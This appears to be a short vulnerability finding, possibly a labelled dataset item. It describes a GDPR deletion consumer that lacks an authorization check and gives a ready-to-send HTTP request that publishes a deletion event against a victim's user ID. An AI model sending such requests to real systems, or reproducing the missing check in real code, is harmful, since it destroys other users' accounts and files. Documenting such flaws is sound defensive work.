diagnosis: The Kafka consumer processes GDPR account deletion requests emitted from client-driven events. The consumer receives targetUserId and requestedByUserId from the message payload but purges the target user's account and files without verifying that requestedByUserId matches targetUserId or possesses compliance officer privileges. Any actor able to trigger this event can destroy arbitrary user accounts.
exploit_request:
POST /api/events/publish HTTP/1.1
Host: api.saasplatform.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"topic": "user.data.gdpr_deletion", "payload": {"targetUserId": "usr_victim_44018", "requestedByUserId": "usr_attacker_9912"}}
